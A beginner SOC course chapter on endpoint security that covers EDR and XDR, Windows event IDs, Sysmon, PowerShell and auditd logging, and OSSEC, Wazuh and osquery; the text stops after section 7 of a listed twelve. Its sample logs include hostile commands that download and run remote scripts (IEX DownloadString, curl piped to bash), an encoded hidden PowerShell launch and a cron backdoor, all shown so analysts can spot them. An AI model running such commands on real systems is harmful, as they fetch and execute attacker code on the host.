# Session 05: Endpoint Security Technologies

**Estimated reading time:** ~2 hours

**Level:** Beginner to Intermediate

**Prerequisites:** Sessions 01–04 (SOC fundamentals, network monitoring, log management, SIEM)

---

## Table of Contents

1. [What Is Endpoint Security and Why It Matters in a SOC](#1-what-is-endpoint-security-and-why-it-matters-in-a-soc)
1. [Endpoint Types](#2-endpoint-types)
1. [Endpoint Detection and Response (EDR)](#3-endpoint-detection-and-response-edr)
1. [Antivirus vs EDR vs XDR](#4-antivirus-vs-edr-vs-xdr)
1. [Windows Security Monitoring](#5-windows-security-monitoring)
1. [Linux Security Monitoring](#6-linux-security-monitoring)
1. [Host-Based Intrusion Detection Systems (HIDS)](#7-host-based-intrusion-detection-systems-hids)
1. [Endpoint Telemetry in a SIEM](#8-endpoint-telemetry-in-a-siem)
1. [Common Endpoint Attacks](#9-common-endpoint-attacks)
1. [Persistence Mechanisms](#10-persistence-mechanisms)
1. [MITRE ATT&CK Endpoint Techniques](#11-mitre-attck-endpoint-techniques)
1. [References](#12-references)

---

## 1. What Is Endpoint Security and Why It Matters in a SOC

An **endpoint** is any device that connects to a network and serves as an entry or exit point for data: laptops, desktops, servers, smartphones, tablets, printers, and IoT sensors.
From a Security Operations Center (SOC) perspective, the endpoint is both the primary target of attackers and the richest source of forensic evidence.

### Why Endpoints Are Priority Targets

Attackers follow the path of least resistance to reach their objectives—data theft, ransomware deployment, espionage.
Endpoints occupy a privileged position in this path because:

* **They run applications.** Every application is a potential attack surface (browsers, Office suites, email clients, custom software).
* **They hold credentials.** Credential material lives in memory (LSASS on Windows), in browser password stores, in SSH key files.
* **They execute code.** Ultimately, an attacker must run code somewhere. Endpoints are where most code execution happens.
* **They are numerous and heterogeneous.** A large organization may have tens of thousands of endpoints running different OS versions, patch levels, and software configurations.
* **Users interact with them.** Phishing, social engineering, and drive-by downloads all exploit the human–endpoint interface.

### The SOC's Relationship with Endpoints

A SOC analyst spends a significant portion of their time investigating endpoint-sourced alerts.
The typical investigation workflow is:

1. Alert fires (SIEM correlation, EDR detection, or AV alert)
1. Analyst triages: Is this a true positive or false positive?
1. If true positive: What happened? How far did it spread? What is the scope?
1. Containment decision: isolate the endpoint, kill the process, block the hash
1. Remediation and recovery
1. Lessons learned and detection tuning

To perform steps 2–4 effectively, the SOC needs **visibility**: detailed telemetry from the endpoint about what processes ran, what files were accessed, what network connections were made, and what registry changes occurred.
This visibility is the core value proposition of modern endpoint security technologies.

### The Cost of Blind Spots

When endpoints are not monitored, attackers can dwell for extended periods without detection.
Industry reports consistently show that the average attacker dwell time (time from initial compromise to detection) has historically been measured in weeks to months.
Every day of undetected access is an opportunity for lateral movement, data exfiltration, or further exploitation.

---

## 2. Endpoint Types

Different endpoint categories present different security challenges and require different monitoring approaches.

### 2.1 Workstations

**Examples:** Windows laptops, macOS desktops, Linux developer machines

Workstations are the most numerous endpoint type and the most frequent target of phishing and malware delivery.
Key risks include:

* User-initiated execution (opening malicious attachments, running untrusted software)
* Credential theft from browser password stores or memory
* Lateral movement staging point

**Monitoring priorities:** Process creation events, PowerShell/script execution, USB device insertion, browser downloads, authentication events.

### 2.2 Servers

**Examples:** Windows Server, Linux servers (web, database, file, domain controllers)

Servers are high-value targets because they host critical data and services.
A compromised Domain Controller (DC) can give an attacker control over an entire Windows environment.

**Monitoring priorities:** Authentication events (especially pass-the-hash, pass-the-ticket), service installation, scheduled task creation, file access to sensitive directories, web server access logs, database query logs.

**Special consideration for Domain Controllers:** Event ID 4768 (Kerberos ticket request), 4769 (Kerberos service ticket request), 4771 (Kerberos pre-authentication failure), and DCSync detection via replication events are critical.

### 2.3 Mobile Devices

**Examples:** iPhones, Android smartphones, tablets

Mobile devices are increasingly used for corporate email and sensitive applications.
They are managed through Mobile Device Management (MDM) solutions (e.g., Microsoft Intune, Jamf).

**Monitoring priorities:** Jailbroken/rooted device detection, app installation from unknown sources, VPN connection anomalies, geo-location anomalies.

**Limitation:** Native endpoint agent deployment is typically restricted on mobile platforms, limiting deep visibility compared to desktops/servers.

### 2.4 IoT and OT Devices

**Examples:** IP cameras, smart building systems, industrial control systems (SCADA/ICS), medical devices

IoT endpoints are often the least secured: many run outdated firmware, have hardcoded credentials, and cannot run traditional security agents.

**Monitoring priorities:** Network traffic analysis (since host-based agents are not feasible), firmware version tracking, authentication anomalies, unusual communication patterns.

**Key challenge:** Many IoT devices cannot be patched or updated without significant operational disruption, making network-level controls the primary defense.

---

## 3. Endpoint Detection and Response (EDR)

### 3.1 What Is EDR?

Endpoint Detection and Response (EDR) is a category of security software that provides:

1. **Continuous monitoring** of endpoint activity
1. **Threat detection** using behavioral analytics, signatures, and machine learning
1. **Automated response** capabilities (process kill, endpoint isolation, file quarantine)
1. **Forensic data collection** for incident investigation

The term "EDR" was coined by Gartner analyst Anton Chuvakin in 2013.
Before EDR, antivirus was the primary endpoint security control—but AV's reliance on static signatures made it ineffective against novel malware and fileless attacks.

### 3.2 EDR Architecture

A typical EDR deployment consists of three tiers:

#### Tier 1: Endpoint Agent

A lightweight agent installed on each endpoint that:

* **Hooks into OS APIs** to capture events (process creation, file I/O, network connections, registry modifications)
* **Collects telemetry** and streams it to the backend
* **Enforces policies** (blocking suspicious processes, isolating the host)
* **Maintains a local cache** of recent events for offline analysis

The agent typically runs as a kernel-level driver and/or a user-space service.
Kernel-level access provides deeper visibility but also requires careful engineering to avoid system instability.

#### Tier 2: Backend Platform

A cloud or on-premise platform that:

* **Ingests and indexes** telemetry from all endpoints
* **Runs detection engines** (signature matching, behavioral rules, ML models)
* **Stores historical data** for retrospective threat hunting
* **Provides APIs** for SIEM integration and automation

#### Tier 3: Analyst Console

A web-based UI that allows analysts to:

* **Browse alerts** and investigate incidents
* **Query historical data** across the entire fleet
* **Run live queries** on endpoints (osquery-style)
* **Take response actions** (isolate host, kill process, delete file)

### 3.3 What Data Does EDR Capture?

EDR agents capture a rich set of telemetry events.
The following categories are universal across vendors:

| Category | Events Captured | Example |
|----------|----------------|---------|
| **Process** | Creation, termination, injection | `cmd.exe` spawned by `winword.exe` |
| **Network** | Connections, DNS queries, HTTP metadata | `powershell.exe` → 185.234.x.x:443 |
| **File** | Creation, modification, deletion, rename | `malware.exe` dropped in `%TEMP%` |
| **Registry** | Key creation, value modification, deletion | Run key added for persistence |
| **Authentication** | Logon, logoff, credential access | Pass-the-hash attempt detected |
| **Script** | PowerShell, VBScript, JScript execution | Encoded PowerShell command detected |
| **Memory** | Injection, hollowing, reflective loading | Process hollowing in `svchost.exe` |
| **Driver** | Load, unload | Unsigned kernel driver loaded |

### 3.4 Detection Approaches

Modern EDR platforms use multiple detection layers:

**Signature-based detection:** Hash matching, YARA rules, known-bad indicators.
Fast and precise but ineffective against novel threats.

**Behavioral detection:** Rules based on sequences of events (e.g., "Office application spawns PowerShell which makes outbound connection").
More effective against novel malware but prone to false positives.

**Machine learning / AI:** Anomaly detection models trained on baseline behavior.
Can detect previously unknown threats but requires tuning to reduce noise.

**Threat intelligence integration:** Matching observed indicators (IPs, domains, hashes) against threat intelligence feeds (VirusTotal, commercial TI feeds).

### 3.5 Major EDR Vendors

#### CrowdStrike Falcon

* **Architecture:** Cloud-native, single lightweight agent ("Falcon Sensor")
* **Key capabilities:** AI/ML detection, Threat Graph (graph-based correlation), Falcon OverWatch (managed threat hunting service)
* **Strengths:** Minimal performance impact, excellent cloud-native architecture, strong threat hunting interface
* **Market position:** Market leader, particularly strong in enterprise

#### SentinelOne Singularity

* **Architecture:** Autonomous agent with on-device AI, cloud management console
* **Key capabilities:** Storyline (automated incident correlation), ActiveEDR (autonomous response), Ranger (network discovery)
* **Strengths:** Autonomous response without cloud dependency, strong rollback capabilities (via VSS integration)
* **Market position:** Strong challenger to CrowdStrike, popular for autonomous response

#### Microsoft Defender for Endpoint (MDE)

* **Architecture:** Tightly integrated with Windows OS; cloud backend in Microsoft 365 Defender portal
* **Key capabilities:** Threat & Vulnerability Management (TVM), Attack Surface Reduction (ASR) rules, integration with Azure Sentinel
* **Strengths:** Native Windows integration (no extra agent for modern Windows), included in Microsoft 365 E5 licensing, deep OS-level visibility
* **Market position:** Dominant in Microsoft-heavy environments, very cost-effective

#### VMware Carbon Black

* **Architecture:** Cloud (Carbon Black Cloud) and on-premise (Carbon Black EDR) offerings
* **Key capabilities:** Behavioral detection via Process Tree, LiveResponse (remote shell), watchlists
* **Strengths:** Detailed process lineage tracking, strong on-premise option
* **Market position:** Strong in regulated industries that cannot use cloud-only solutions

#### Other Notable EDR Solutions

* **Palo Alto Cortex XDR:** Combines endpoint, network, and cloud telemetry
* **Elastic Security:** Open-source EDR component built on Elastic Stack
* **ESET Enterprise Inspector:** EDR component of ESET security suite

---

## 4. Antivirus vs EDR vs XDR

Understanding the differences between these technologies helps SOC teams select the right tools and set realistic expectations.

### 4.1 Traditional Antivirus (AV)

**What it does:**

* Scans files against a database of known malicious signatures (MD5/SHA hashes, byte patterns)
* Heuristic analysis of file structure
* On-access scanning (file open/write triggers scan)
* Scheduled full-system scans

**What it misses:**

* Fileless malware (no file to scan)
* Novel malware with no signature yet
* LOLBin abuse (legitimate tools used maliciously)
* Memory-only payloads
* Polymorphic malware that changes its signature

**Appropriate use case:** Defense-in-depth layer; good at blocking commodity malware; insufficient as sole endpoint protection.

### 4.2 Endpoint Detection and Response (EDR)

**What it adds over AV:**

* Behavioral monitoring (not just file scanning)
* Process lineage tracking ("who spawned this process?")
* Memory analysis
* Network telemetry per process
* Forensic data retention for investigation
* Response capabilities (isolate, kill, rollback)

**What it misses:**

* Network-level threats (if only looking at the endpoint)
* Cloud application threats
* Email-based attacks (before they reach the endpoint)
* Requires agent deployment on every endpoint

### 4.3 Extended Detection and Response (XDR)

XDR extends EDR by integrating telemetry from multiple sources:

```text
XDR = EDR + Network Detection + Cloud Workload + Email Security + Identity
```

**Key difference:** XDR correlates alerts across domains.
A phishing email, the resulting process execution, the network callback, and the cloud storage access are all linked in a single investigation timeline.

**Examples of XDR products:**

* Microsoft Defender XDR (formerly M365 Defender)
* Palo Alto Cortex XDR
* SentinelOne Singularity XDR
* CrowdStrike Falcon XDR

### Comparison Table

| Feature | Traditional AV | EDR | XDR |
|---------|---------------|-----|-----|
| File scanning | Yes | Yes | Yes |
| Behavioral detection | Limited | Yes | Yes |
| Process lineage | No | Yes | Yes |
| Network correlation | No | Endpoint only | Cross-domain |
| Email/Cloud telemetry | No | No | Yes |
| Automated response | Basic (quarantine) | Advanced | Advanced |
| Forensic retention | No | Yes | Yes |
| Threat hunting | No | Yes | Yes |
| Analyst console | Basic | Full | Full |
| Typical cost | Low | Medium-High | High |

---

## 5. Windows Security Monitoring

Windows provides extensive built-in security logging through the Windows Event Log system.
Understanding which events to collect and what they mean is fundamental for SOC work.

### 5.1 Windows Event Log Architecture

Windows logs are stored in `.evtx` format and organized by channel:

* **Security** (`%SystemRoot%\System32\winevt\Logs\Security.evtx`) — Authentication, authorization, audit policy
* **System** (`%SystemRoot%\System32\winevt\Logs\System.evtx`) — OS-level events, service changes
* **Application** (`%SystemRoot%\System32\winevt\Logs\Application.evtx`) — Application-specific events
* **Microsoft-Windows-Sysmon/Operational** — Sysmon events (if installed)
* **Microsoft-Windows-PowerShell/Operational** — PowerShell execution details
* **Microsoft-Windows-WMI-Activity/Operational** — WMI activity

### 5.2 Critical Windows Security Event IDs

#### Authentication Events

**Event ID 4624 — An account was successfully logged on**

This is the most important authentication event.
Key fields to analyze:

```text
Log Name: Security
Event ID: 4624
Subject:
  Account Name: SYSTEM
  Account Domain: WORKSTATION01
Logon Type: 3
New Logon:
  Account Name: jdoe
  Account Domain: CORP
  Logon GUID: {d4e6f2a1-...}
Network Information:
  Workstation Name: LAPTOP-HR01
  Source Network Address: 10.10.5.22
  Source Port: 54231
Process Information:
  Process Name: C:\Windows\System32\winlogon.exe
```

**Logon Types are critical:**

| Logon Type | Name | Description | Security Relevance |
|-----------|------|-------------|-------------------|
| 2 | Interactive | Physical keyboard/console logon | Normal workstation use |
| 3 | Network | SMB, file share, network logon | Lateral movement indicator |
| 4 | Batch | Scheduled task execution | Check the task |
| 5 | Service | Service startup | Verify service account |
| 7 | Unlock | Screen unlock | Normal |
| 8 | NetworkCleartext | Network logon with cleartext password | **Alert!** Credentials sent in clear |
| 9 | NewCredentials | RunAs with different credentials | Possible lateral movement |
| 10 | RemoteInteractive | RDP logon | Track RDP access |
| 11 | CachedInteractive | Offline cached credentials | Laptop offline use |

**Event ID 4625 — An account failed to log on**

Failed logon events indicate brute force attempts or credential errors.
Fields of interest:

* **Failure Reason:** Bad password vs. account disabled vs. account locked
* **Source Network Address:** Origin of the attempt
* **Account Name:** Which account is being targeted

**Correlation rule:** 5+ failed logons (4625) from the same source within 5 minutes → brute force alert.

**Event ID 4648 — A logon was attempted using explicit credentials**

Occurs when `RunAs` is used or when a process uses `LogonUser()` API with different credentials.
This is a key indicator for:

* Pass-the-hash attacks (though those typically generate type 3 with no password)
* Credential abuse
* Lateral movement tools (psexec, wmiexec)

#### Process Execution Events

**Event ID 4688 — A new process has been created**

The most important event for detecting malicious execution.
Key fields:

```text
Event ID: 4688
New Process Information:
  New Process ID: 0x1234
  New Process Name: C:\Windows\System32\cmd.exe
  Token Elevation Type: %%1937 (Full Token)
  Creator Process ID: 0x5678
  Creator Process Name: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
  Process Command Line: cmd.exe /c powershell -enc JABjAGwAaQBlAG4AdA...
```

**Critical field: Creator Process Name** — The parent process.
When cmd.exe or PowerShell is spawned by Word/Excel/PDF readers, this is almost always malicious.

**Enable command line auditing:** By default, Event 4688 does not capture the full command line.
Enable it via:

* Group Policy → Computer Configuration → Windows Settings → Security Settings → Advanced Audit Policy Configuration → Detailed Tracking → Audit Process Creation → Enable command line in process creation events

#### Scheduled Task Events

**Event ID 4698 — A scheduled task was created**

Attackers commonly create scheduled tasks for persistence.
Key fields:

* **Task Name:** Suspicious names try to blend in (e.g., "WindowsUpdate", "MicrosoftEdgeUpdate")
* **Task Content:** XML showing the action, trigger, and run-as account
* **Subject Account Name:** Who created the task

**Event ID 4702 — A scheduled task was updated**
**Event ID 4699 — A scheduled task was deleted**

These form the complete picture of scheduled task lifecycle.

#### Policy and Configuration Changes

**Event ID 4719 — System audit policy was changed**

An attacker who gains admin access will often disable audit logging to cover their tracks.
This event captures changes to audit policy.
Alert on any unexpected changes.

**Event ID 4657 — A registry value was modified**
**Event ID 4670 — Permissions on an object were changed**

#### Service Events

**Event ID 7045 — A new service was installed in the system (System log)**

Service installation is a common persistence technique and a common method for running malicious code with SYSTEM privileges.
Key fields:

* Service Name
* Service File Name (the binary path — watch for unusual paths like `%TEMP%`, `AppData`)
* Service Type
* Service Start Type
* Service Account

**Malicious pattern:** A service with a random-looking name, installed from an unusual path, set to run as SYSTEM.

### 5.3 Sysmon (System Monitor)

Sysmon is a free Windows system service developed by Sysinternals (now part of Microsoft).
It extends Windows native auditing with much richer endpoint telemetry.

#### Why Sysmon Over Native Windows Logging?

| Capability | Native Windows | Sysmon |
|-----------|---------------|--------|
| Process creation with full cmdline | Requires policy change | Always |
| Parent process info | Limited | Full lineage |
| Network connections per process | No | Yes (Event ID 3) |
| DNS queries | No | Yes (Event ID 22) |
| File creation time changes | No | Yes (Event ID 2) |
| Image load (DLL) tracking | No | Yes (Event ID 7) |
| Registry monitoring | Limited | Comprehensive (Events 12, 13, 14) |
| Pipe creation | No | Yes (Events 17, 18) |
| File deletion | No | Yes (Event ID 23) |
| Clipboard events | No | Yes (Event ID 24) |
| Named pipe connection | No | Yes (Event ID 18) |
| WMI events | No | Yes (Events 19, 20, 21) |

#### Key Sysmon Event IDs

| Event ID | Description | Security Use |
|---------|-------------|-------------|
| 1 | Process Create | Full command line, parent info, hashes |
| 2 | File creation time changed | Timestomping detection |
| 3 | Network connection | Outbound connections per process |
| 4 | Sysmon service state changed | Agent tampering detection |
| 5 | Process terminated | Correlate with Event 1 |
| 6 | Driver loaded | Rootkit/kernel driver detection |
| 7 | Image loaded | DLL hijacking, side-loading detection |
| 8 | CreateRemoteThread | Process injection detection |
| 9 | RawAccessRead | Direct disk reads (evading file monitoring) |
| 10 | ProcessAccess | LSASS access (credential dumping) |
| 11 | FileCreate | Dropped files, staging |
| 12 | RegistryEvent (object create/delete) | Persistence via registry |
| 13 | RegistryEvent (value set) | Registry-based persistence |
| 14 | RegistryEvent (key/value rename) | Registry tampering |
| 15 | FileCreateStreamHash | Alternate Data Streams (ADS) |
| 17 | PipeEvent (pipe created) | Lateral movement (SMB pipes) |
| 18 | PipeEvent (pipe connected) | Lateral movement |
| 19 | WMIEvent (filter) | WMI persistence |
| 20 | WMIEvent (consumer) | WMI persistence |
| 21 | WMIEvent (consumer-to-filter) | WMI persistence |
| 22 | DNSEvent | C2 beacon detection via DNS |
| 23 | FileDelete | Evidence deletion, cleanup |
| 24 | ClipboardChange | Data theft, credential paste |
| 25 | ProcessTampering | Process hollowing detection |

#### Sysmon Configuration

Sysmon's value is multiplied by a good configuration file.
The most widely used is the SwiftOnSecurity Sysmon config:

```xml
<Sysmon schemaversion="4.82">
  <HashAlgorithms>MD5,SHA256,IMPHASH</HashAlgorithms>
  <CheckRevocation/>
  <EventFiltering>
    <!-- Event ID 1 == Process Create -->
    <RuleGroup name="" groupRelation="or">
      <ProcessCreate onmatch="exclude">
        <!-- Reduce noise: exclude known-good processes -->
        <Image condition="is">C:\Windows\System32\conhost.exe</Image>
      </ProcessCreate>
    </RuleGroup>
    <!-- Event ID 3 == Network Connection -->
    <RuleGroup name="" groupRelation="or">
      <NetworkConnect onmatch="include">
        <!-- Only log external connections -->
        <DestinationIp condition="is not">127.0.0.1</DestinationIp>
      </NetworkConnect>
    </RuleGroup>
    <!-- Event ID 10 == ProcessAccess (LSASS monitoring) -->
    <RuleGroup name="" groupRelation="or">
      <ProcessAccess onmatch="include">
        <TargetImage condition="is">C:\Windows\system32\lsass.exe</TargetImage>
      </ProcessAccess>
    </RuleGroup>
  </EventFiltering>
</Sysmon>
```

#### Sysmon Event Examples

**Example: Malicious PowerShell execution (Event ID 1)**

```xml
<Event>
  <EventID>1</EventID>
  <TimeCreated SystemTime="2024-03-15T14:23:01.123456789Z"/>
  <Computer>WORKSTATION01.corp.local</Computer>
  <Data Name="RuleName">-</Data>
  <Data Name="UtcTime">2024-03-15 14:23:01.123</Data>
  <Data Name="ProcessGuid">{a1b2c3d4-...}</Data>
  <Data Name="ProcessId">4592</Data>
  <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
  <Data Name="FileVersion">10.0.19041.546</Data>
  <Data Name="CommandLine">powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAA...</Data>
  <Data Name="CurrentDirectory">C:\Users\jdoe\AppData\Local\Temp\</Data>
  <Data Name="User">CORP\jdoe</Data>
  <Data Name="LogonId">0x1a2b3c</Data>
  <Data Name="ParentProcessGuid">{d4e5f6a7-...}</Data>
  <Data Name="ParentProcessId">3120</Data>
  <Data Name="ParentImage">C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</Data>
  <Data Name="ParentCommandLine">"WINWORD.EXE" /n "C:\Users\jdoe\Downloads\invoice.docm"</Data>
  <Data Name="MD5">A1B2C3D4E5F6...</Data>
  <Data Name="SHA256">ABCDEF1234567890...</Data>
</Event>
```

**Red flags in this event:**

* PowerShell spawned by Word (`WINWORD.EXE`) — macro execution
* `-nop` (NoProfile) `-w hidden` (WindowStyle Hidden) — evasion flags
* `-enc` followed by Base64 — obfuscated command
* Working directory is `%TEMP%` — staging area

### 5.4 PowerShell Logging

PowerShell is both a powerful administrative tool and the most abused LOLBin in Windows environments.
Comprehensive PowerShell logging requires enabling three features:

#### Module Logging (Event ID 4103)
Logs the pipeline execution details of PowerShell commands.
Every command that runs, its parameters, and output.

Enable via: Group Policy → Administrative Templates → Windows Components → Windows PowerShell → Turn on Module Logging → Set module names to `*`

#### Script Block Logging (Event ID 4104)
**The most important PowerShell log.** Captures the full text of every PowerShell script block as it executes, including dynamically generated code (deobfuscated, after execution).

```text
Event ID: 4104
Source: PowerShell
Message: Creating Scriptblock text (1 of 1):
IEX (New-Object Net.WebClient).DownloadString('http://185.234.x.x/stage2.ps1')

ScriptBlock ID: {a1b2c3d4-e5f6-7890-abcd-ef1234567890}
Path:
```

Enable via: Group Policy → Administrative Templates → Windows Components → Windows PowerShell → Turn on PowerShell Script Block Logging

#### Transcription Logging (Event ID N/A — text files)
Creates a human-readable transcript of every PowerShell session, saved to a file.
Useful for forensics but generates large volumes of data.

---

## 6. Linux Security Monitoring

Linux security monitoring relies on multiple subsystems, each providing different visibility.

### 6.1 The auditd Framework

The Linux Audit Daemon (`auditd`) is the primary kernel-level auditing framework for Linux.
It captures events directly from the Linux kernel's audit subsystem, providing reliable logging that is difficult for user-space processes to evade.

#### Architecture

```text
Linux Kernel Audit Subsystem
        |
        | netlink socket
        |
   auditd daemon
        |
   /var/log/audit/audit.log
        |
   audisp (audit dispatcher) → SIEM/syslog
```

#### Key Configuration Files

* `/etc/audit/auditd.conf` — Daemon configuration (log rotation, buffer size, disk space handling)
* `/etc/audit/audit.rules` (or `/etc/audit/rules.d/*.rules`) — Audit rules

#### Understanding Audit Rules

Audit rules have three forms:

**Control rules** modify the audit system behavior:

```console
-b 8192          # Buffer size for kernel audit messages
-f 2             # Failure mode: 2 = kernel panic on failure (high security)
-e 2             # Lock the audit configuration (immutable mode)
```

**File system (watch) rules** monitor specific files or directories:

```bash
-w /etc/passwd -p wa -k identity_changes
# -w: watch this path
# -p wa: permissions: write (w) and attribute change (a)
# -k: key tag for searching in audit log

-w /etc/shadow -p wa -k shadow_changes
-w /etc/sudoers -p wa -k sudoers_changes
-w /var/log/ -p wa -k log_tampering
-w /etc/ssh/sshd_config -p wa -k sshd_config
```

**System call rules** capture specific syscall execution:

```bash
-a always,exit -F arch=b64 -S execve -k exec_monitoring
# -a: add rule; always,exit: when/what to log
# -F arch=b64: 64-bit processes
# -S execve: the execve() system call (program execution)
# -k: search key

# Monitor privilege escalation
-a always,exit -F arch=b64 -S setuid -S setgid -k privesc

# Monitor network connections
-a always,exit -F arch=b64 -S connect -k network_connect

# Monitor changes to authentication config
-a always,exit -F arch=b64 -S open -F dir=/etc/pam.d -F perm=wa -k pam_changes
```

#### Reading Audit Log Entries

Audit log entries can be complex.
Here is an annotated example:

```text
type=SYSCALL msg=audit(1710506401.123:4521): arch=c000003e syscall=59 success=yes exit=0
a0=55a1b2c3d4e0 a1=55a1b2c3d500 a2=55a1b2c3d520 a3=0 items=2 ppid=1234 pid=5678
auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0
ses=1 comm="bash" exe="/bin/bash" subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
key="exec_monitoring"

type=EXECVE msg=audit(1710506401.123:4521): argc=3 a0="bash" a1="-c"
a2="curl http://185.234.x.x/payload.sh | bash"

type=CWD msg=audit(1710506401.123:4521): cwd="/root"
```

**Breaking down the key fields:**

* `type=SYSCALL` — System call record
* `msg=audit(TIMESTAMP:SEQUENCE)` — Timestamp (Unix epoch) and sequence number
* `syscall=59` — System call number (59 = execve on x86_64)
* `ppid=1234` — Parent PID
* `pid=5678` — Process PID
* `auid=1000` — Audit UID (the login UID, survives su/sudo)
* `uid=0` — Current UID (root after sudo)
* `exe="/bin/bash"` — Executable
* `key="exec_monitoring"` — Audit rule key that triggered this event

The `auid` (audit UID) is particularly valuable: it tracks the original login identity even after `sudo` or `su`.

#### Using ausearch and aureport

```bash
# Search for events by key
ausearch -k exec_monitoring

# Search for events by PID
ausearch -p 5678

# Search for events by user
ausearch -ua jdoe

# Search for events in a time range
ausearch --start 14:00:00 --end 15:00:00

# Generate summary reports
aureport --summary
aureport --auth         # Authentication events
aureport --failed       # Failed events
aureport --executable   # Executable events
```

### 6.2 System Log Files

#### /var/log/auth.log (Debian/Ubuntu) and /var/log/secure (RHEL/CentOS)

These files record all authentication-related events.
Key patterns to monitor:

**Successful SSH login:**

```text
Mar 15 14:23:01 server01 sshd[12345]: Accepted publickey for jdoe from 10.10.5.22 port 54231 ssh2: RSA SHA256:abc123...
Mar 15 14:23:01 server01 sshd[12345]: pam_unix(sshd:session): session opened for user jdoe by (uid=0)
```

**Failed SSH login (brute force indicator):**

```text
Mar 15 14:22:55 server01 sshd[12344]: Failed password for invalid user admin from 185.234.x.x port 33721 ssh2
Mar 15 14:22:56 server01 sshd[12345]: Failed password for invalid user root from 185.234.x.x port 33722 ssh2
Mar 15 14:22:57 server01 sshd[12346]: Failed password for invalid user ubuntu from 185.234.x.x port 33723 ssh2
```

**Sudo usage:**

```text
Mar 15 14:25:01 server01 sudo:    jdoe : TTY=pts/0 ; PWD=/home/jdoe ; USER=root ; COMMAND=/bin/bash
Mar 15 14:25:01 server01 sudo: pam_unix(sudo:session): session opened for user root by jdoe(uid=1000)
```

**Suspicious: sudo to bash (breakout from restricted shell):**

```text
Mar 15 14:25:01 server01 sudo:    www-data : TTY=unknown ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
```

#### /var/log/syslog and /var/log/messages

General system logs including cron, service start/stop, kernel messages:

```text
Mar 15 14:30:00 server01 CRON[23456]: (root) CMD (/tmp/.x/backdoor &>/dev/null)
Mar 15 14:30:01 server01 systemd[1]: Started [Unit Name].
```

### 6.3 PAM (Pluggable Authentication Modules) Logging

PAM is the authentication framework used by virtually all Linux login mechanisms.
PAM events appear in auth.log/secure and can be used to detect:

* Authentication bypass attempts
* Use of su/sudo
* Login from unusual sources

### 6.4 Process Monitoring with /proc

The `/proc` filesystem provides real-time process information without needing an agent:

```bash
# List all running processes with their cmdline
for pid in /proc/[0-9]*; do
  echo "PID: $(basename $pid)"
  cat $pid/cmdline 2>/dev/null | tr '\0' ' '
  echo
done

# Check network connections per process (similar to netstat)
ss -tlnp

# Check for unusual listening ports
ss -tlnp | grep -v -E '(sshd|nginx|apache|mysqld)'

# Check loaded kernel modules
lsmod | grep -v -E '(iptable|nf_|ip_|ext4|xfs)'
```

### 6.5 Linux Logging Pipeline to SIEM

```text
auditd → audisp → syslog (rsyslog/syslog-ng) → SIEM
       → aureport → scheduled reports

auth.log + syslog → rsyslog → forwarded via TCP/UDP → SIEM
                            → encrypted via TLS    → SIEM (production)
```

---

## 7. Host-Based Intrusion Detection Systems (HIDS)

HIDS run on individual hosts and analyze local activity for signs of compromise.
Unlike EDR (which focuses on behavioral detection), traditional HIDS focus on **file integrity monitoring (FIM)**, **log analysis**, and **rootkit detection**.

### 7.1 OSSEC

OSSEC (Open Source Security) is one of the most widely deployed open-source HIDS.
It provides:

* **File Integrity Monitoring (FIM):** Detects changes to critical files (config files, binaries, logs)
* **Log Analysis:** Parses logs from many sources and applies detection rules
* **Rootkit Detection:** Checks for known rootkit signatures
* **Active Response:** Can automatically block IPs, kill processes
* **Centralized Management:** Multiple agents report to a single manager

**OSSEC Architecture:**

```text
OSSEC Manager (central)
    ↑ encrypted, authenticated
OSSEC Agents (on each endpoint)
    ← monitors: files, logs, processes, registry (Windows)
```

**Example OSSEC rule (detecting an SSH brute force):**

```xml
<rule id="5720" level="10" frequency="8" timeframe="120">
  <if_matched_sid>5716</if_matched_sid>
  <description>sshd: Multiple authentication failures.</description>
  <group>authentication_failures,pci_dss_10.2.4,pci_dss_10.2.5</group>
</rule>
```

### 7.2 Wazuh

Wazuh is the most actively maintained fork of OSSEC, with significant enhancements:

* **OSSEC compatibility:** Uses the same agent and rule format
* **Elastic Stack integration:** Ships events to Elasticsearch/OpenSearch with a pre-built Kibana dashboard
* **Vulnerability Detection:** Integrates with the NVD to identify vulnerable packages
* **Security Configuration Assessment (SCA):** CIS benchmark checks
* **Cloud Integration:** AWS, Azure, GCP log ingestion
* **MITRE ATT&CK mapping:** Alerts are tagged with ATT&CK technique IDs
* **API:** RESTful API for automation

**Wazuh Architecture:**

```text
Wazuh Agents
    ↓ (encrypted)
Wazuh Manager → Elasticsearch/OpenSearch → Kibana (Wazuh Dashboard)
    ↑
Wazuh Indexer
```

**Wazuh Docker Deployment:**

```yaml
version: '3.8'
services:
  wazuh.manager:
    image: wazuh/wazuh-manager:4.7.0
    ports:
      - "1514:1514"       # Agent communication
      - "1515:1515"       # Agent enrollment
      - "55000:55000"     # REST API
  wazuh.indexer:
    image: wazuh/wazuh-indexer:4.7.0
  wazuh.dashboard:
    image: wazuh/wazuh-dashboard:4.7.0
    ports:
      - "443:5601"
```

### 7.3 osquery

osquery, developed by Facebook (Meta), takes a different approach to endpoint monitoring: it exposes the operating system as a **relational database** that can be queried with SQL.

```sql
-- Find all listening network connections
SELECT pid, family, protocol, local_address, local_port, remote_address, remote_port
FROM process_open_sockets
WHERE state = 'LISTEN';

-- Detect suspicious processes with network connections
SELECT p.pid, p.name, p.path, p.cmdline, l.remote_address, l.remote_port
FROM processes p
JOIN process_open_sockets l ON p.pid = l.pid
WHERE l.remote_address NOT IN ('0.0.0.0', '::', '127.0.0.1')
  AND l.remote_port NOT IN (80, 443, 53);

-- Check for unusual cron jobs
SELECT event, minute, hour, day_of_month, month, day_of_week, command, path
FROM crontab;

-- Find recently modified files in /tmp
SELECT path, filename, mtime, size, md5
FROM file
WHERE path LIKE '/tmp/%'
  AND mtime > (strftime('%s', 'now') - 3600);

-- Detect SUID/SGID binaries not in standard locations
SELECT path, permissions, uid, gid
FROM file
WHERE (permissions LIKE '%s%' OR permissions LIKE '%S%')
  AND path NOT LIKE '/usr/%'
  AND path NOT LIKE '/bin/%'
  AND path NOT LIKE '/sbin/%';
```

osquery can run **scheduled queries** (called "packs") that collect data at regular intervals and ship results to a SIEM.

---

